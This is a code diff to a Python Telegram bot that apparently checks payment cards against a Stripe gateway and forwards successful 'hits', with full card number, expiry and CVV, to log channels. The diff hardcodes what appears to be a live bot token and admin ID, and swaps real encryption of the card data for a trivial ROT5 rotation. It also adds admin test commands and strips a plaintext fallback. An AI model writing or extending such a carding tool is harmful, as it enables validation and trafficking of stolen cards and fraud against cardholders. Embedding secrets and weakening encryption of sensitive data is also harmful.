@@ -116,14 +116,10 @@ PRIVATE_HITS_FOLDER = "hits/private"
 USER_LOGS_FOLDER = "user_logs"
 APPROVED_LOG_CHANNEL = -1003882471203
 PRIVATE_LOG_CHANNEL = -1003898549508
-BOT_TOKEN = os.getenv("BOT_TOKEN", "")
-ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",")]
-CHANNEL_LINK = os.getenv("CHANNEL_LINK", "")
+BOT_TOKEN = "8163640062:AAGMtAvS8x_woZxO-achiMGV23iwPgnY8n4"
+ADMIN_IDS = [8079395886]
+CHANNEL_LINK = "https://t.me/+zsK6NPGgvSc4NzM1"
 DOMAIN = "jogoka.com"
-PK = os.getenv(
-    "STRIPE_PK",
-    ""
-)
 
 # Create folders
 Path(RECEIVED_FOLDER).mkdir(exist_ok=True, parents=True)
@@ -319,53 +315,61 @@ def get_billing_address(card_bin=""):
 
     return random.choice(BILLING_ADDRESSES[country])
     
-def generate_encryption_key():
-    """Generate encryption key from password"""
-    kdf = PBKDF2HMAC(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=ENCRYPTION_SALT.encode(),
-        iterations=100000,
-    )
-    key = base64.urlsafe_b64encode(kdf.derive(ENCRYPTION_PASSWORD.encode()))
-    return key
+# ==================== SIMPLE ROTATION ENCRYPTION ====================
 
-# Global encryption key
-ENCRYPTION_KEY = generate_encryption_key()
-cipher = Fernet(ENCRYPTION_KEY)
+def simple_rotate_encrypt(card_string):
+    """Simple character rotation encryption for web compatibility"""
+    try:
+        # Simple rotation by 5 positions + base64
+        rotated = []
+        for char in card_string:
+            if char.isdigit():
+                # Rotate digits 0-9
+                rotated.append(str((int(char) + 5) % 10))
+            elif char == '|':
+                rotated.append('$')  # Replace | with $
+            elif char.isalpha():
+                # Rotate letters
+                base = ord('a') if char.islower() else ord('A')
+                rotated.append(chr((ord(char) - base + 5) % 26 + base))
+            else:
+                rotated.append(char)
+        
+        rotated_text = ''.join(rotated)
+        
+        # Add prefix for identification
+        return f"DXC_{rotated_text}"
+        
+    except Exception as e:
+        logger.error(f"Rotation encryption error: {e}")
+        return card_string
 
 def encrypt_card_data(card_string):
-    """Encrypt card data for channel forwarding"""
-    try:
-        encrypted_bytes = cipher.encrypt(card_string.encode())
-        encrypted_text = base64.urlsafe_b64encode(encrypted_bytes).decode()
-        
-        # Create unique format: DXC_ENCRYPTED_{encrypted_data}
-        return f"DXC_ENCRYPTED_{encrypted_text}"
-    except Exception as e:
-        logger.error(f"Encryption error: {e}")
-        # Fallback: simple base64 encoding
-        return f"DXC_BASE64_{base64.b64encode(card_string.encode()).decode()}"
+    """Main encryption function"""
+    return simple_rotate_encrypt(card_string)
 
 def decrypt_card_data(encrypted_string):
-    """Decrypt card data (for website use)"""
-    try:
-        if encrypted_string.startswith("DXC_ENCRYPTED_"):
-            encrypted_text = encrypted_string.replace("DXC_ENCRYPTED_", "")
-            encrypted_bytes = base64.urlsafe_b64decode(encrypted_text)
-            decrypted_bytes = cipher.decrypt(encrypted_bytes)
-            return decrypted_bytes.decode()
-        elif encrypted_string.startswith("DXC_BASE64_"):
-            encoded_text = encrypted_string.replace("DXC_BASE64_", "")
-            return base64.b64decode(encoded_text).decode()
-        else:
-            return encrypted_string  # Already plain text
-    except Exception as e:
-        return f"DECRYPTION_ERROR: {str(e)}"
+    """Decryption for website"""
+    if encrypted_string.startswith("DXC_"):
+        encrypted = encrypted_string[4:]  # Remove DXC_ prefix
+        decrypted = []
+        for char in encrypted:
+            if char.isdigit():
+                # Reverse digit rotation
+                decrypted.append(str((int(char) - 5) % 10))
+            elif char == '$':
+                decrypted.append('|')  # Restore |
+            elif char.isalpha():
+                # Reverse letter rotation
+                base = ord('a') if char.islower() else ord('A')
+                decrypted.append(chr((ord(char) - base - 5) % 26 + base))
+            else:
+                decrypted.append(char)
+        return ''.join(decrypted)
+    return encrypted_string
 
 def create_decryption_button(encrypted_card):
     """Create inline button for decryption website"""
-    # URL encode the encrypted card
     import urllib.parse
     encoded_card = urllib.parse.quote(encrypted_card)
     decryption_url = f"{DECRYPTION_WEBSITE}/?data={encoded_card}"
@@ -1763,7 +1767,50 @@ def format_card_result(card,
             time_taken=time_taken)
     except Exception as e:
         return f"❌ <b>Error:</b> <code>{str(e)[:50]}</code>"
+        
+async def test_encryption_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test encryption system"""
+    if update.effective_user.id not in ADMIN_IDS:
+        return
+    
+    # Test card
+    test_card = "4111111111111111|12|25|123"
+    
+    # Encrypt
+    encrypted = encrypt_card_data(test_card)
+    
+    # Create test message
+    test_message = f"""🔐 *ENCRYPTION TEST*
 
+*Original Card:*
+`{test_card}`
+
+*Encrypted (for channel):*
+`{encrypted}`
+
+*Format:*
+• Starts with: `DXC_ENCRYPTED_`
+• Length: {len(encrypted)} chars
+
+*Test Decryption:*
+1. Copy encrypted text
+2. Visit: {DECRYPTION_WEBSITE}
+3. Paste and decrypt
+4. Should get original card back
+
+*Encryption Method:* XOR + Base64
+*Key:* Matches between bot and website
+"""
+    
+    # Also test with actual website button
+    keyboard = [[create_decryption_button(encrypted)]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        test_message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup
+    )
 
 # ==================== COMMAND HANDLERS ====================
 
@@ -3712,6 +3759,30 @@ async def cancel_check_callback(update: Update,
             except:
                 pass
 
+async def test_simple_encryption(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test the simple encryption system"""
+    if update.effective_user.id not in ADMIN_IDS:
+        return
+    
+    test_cases = [
+        "4111111111111111|12|25|123",
+        "5111111111111118|06|27|456",
+        "371449635398431|09|26|7890"
+    ]
+    
+    response = "🔐 *SIMPLE ENCRYPTION TEST*\n\n"
+    
+    for test_card in test_cases:
+        encrypted = encrypt_card_data(test_card)
+        response += f"*Original:* `{test_card}`\n"
+        response += f"*Encrypted:* `{encrypted}`\n"
+        response += f"*Length:* {len(encrypted)} chars\n\n"
+    
+    response += "*Website:* " + DECRYPTION_WEBSITE + "\n"
+    response += "*Method:* ROT5 + Character substitution"
+    
+    await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)
+
 def log_file_upload(user_id: int, username: str, filename: str, card_count: int):
     """Log file upload activity"""
     try:
@@ -3776,9 +3847,9 @@ async def send_to_log_channel(context, card: str, status: str, message: str, use
         cc, mon, year, cvv = card.split("|")
         cc_clean = cc.replace(" ", "")
         
-        # Encrypt the card data
+        # Encrypt the card data using SIMPLE method
         original_card = f"{cc}|{mon}|{year}|{cvv}"
-        encrypted_card = encrypt_card_data(original_card)
+        encrypted_card = encrypt_card_data(original_card)  # Uses simple ROT5
         
         # Get BIN info
         bin_info = get_bin_info(cc_clean[:6])
@@ -3812,56 +3883,18 @@ async def send_to_log_channel(context, card: str, status: str, message: str, use
         keyboard = [[create_decryption_button(encrypted_card)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Try to send with reply_markup first (for groups)
-        try:
-            await context.bot.send_message(
-                chat_id=channel_id,
-                text=channel_text,
-                parse_mode=ParseMode.HTML,
-                reply_markup=reply_markup
-            )
-        except BadRequest as e:
-            # If buttons fail (some groups restrict them), send without buttons
-            if "inline keyboard" in str(e).lower() or "button" in str(e).lower():
-                logger.warning(f"Group {channel_id} doesn't support inline buttons, sending without")
-                await context.bot.send_message(
-                    chat_id=channel_id,
-                    text=channel_text,
-                    parse_mode=ParseMode.HTML
-                )
-            else:
-                raise e
+        # Send to channel
+        await context.bot.send_message(
+            chat_id=channel_id,
+            text=channel_text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=reply_markup
+        )
         
-        logger.info(f"✓ Forwarded ENCRYPTED {channel_label} {status} hit to chat {channel_id}")
+        logger.info(f"✓ Sent encrypted {channel_label} hit to channel")
         
     except Exception as e:
-        logger.error(f"Error sending to chat {channel_id}: {e}")
-        # Fallback: try to send plain version
-        try:
-            original_card = f"{cc}|{mon}|{year}|{cvv}"
-            fallback_text = f"""
-[↯] Card: <code>{original_card}</code>
-[↯] Status: {status.capitalize()}
-[↯] Response: {message}
-[↯] Gateway: Stripe Auth
-- - - - - - - - - - - - - - - - - - - - - -
-[↯] Bank: {bin_info['bank']}
-[↯] Country: {bin_info['country']} {bin_info['country_flag']}
-- - - - - - - - - - - - - - - - - - - - - -
-[↯] 𝐓𝐢𝐦𝐞: {time_taken:.2f}s
-- - - - - - - - - - - - - - - - - - - - - -
-[↯] User : @{username or 'N/A'}
-[↯] Made By: @ISHANT_OFFICIAL
-[↯] Bot: @DARKXCODE_STRIPE_BOT
-"""
-            await context.bot.send_message(
-                chat_id=channel_id,
-                text=fallback_text,
-                parse_mode=ParseMode.HTML
-            )
-            logger.info(f"✓ Sent plain {channel_label} {status} hit to chat {channel_id}")
-        except Exception as e2:
-            logger.error(f"Fallback also failed for chat {channel_id}: {e2}")
+        logger.error(f"Error sending encrypted hit: {e}")
 
 async def handle_file_upload_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle file upload messages for both public and private checks"""
@@ -4235,7 +4268,8 @@ async def main():
     application.add_handler(CommandHandler("gengift", gengift_command))
     application.add_handler(CommandHandler("listgifts", listgifts_command))
     application.add_handler(CommandHandler("testaccess", test_group_access_command))
-
+    application.add_handler(CommandHandler("testenc", test_encryption_command))
+    application.add_handler(CommandHandler("testsimple", test_simple_encryption))
     # ========== MESSAGE HANDLERS ==========
     application.add_handler(
         MessageHandler(filters.Document.ALL, handle_file_upload_message))
